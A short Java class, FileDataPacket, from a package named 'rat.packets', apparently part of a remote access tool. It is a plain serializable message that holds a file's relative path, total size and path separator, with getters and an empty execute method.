package rat.packets;

import java.io.File;
import java.io.Serializable;

public class FileDataPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 5279113902729568201L;

    private long totalSize;

    private String relativePath;

    private String separator;

    public FileDataPacket(String relativePath, long totalSize) {
        this.relativePath = relativePath;
        this.separator = File.separator;
        this.totalSize = totalSize;
    }

    @Override
    public void execute() {
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.FILE_DATA;
    }

    public String getSeparator() {
        return separator;
    }

    public String getRelativePath() {
        return relativePath;
    }

    public long getTotalSize() {
        return totalSize;
    }
}
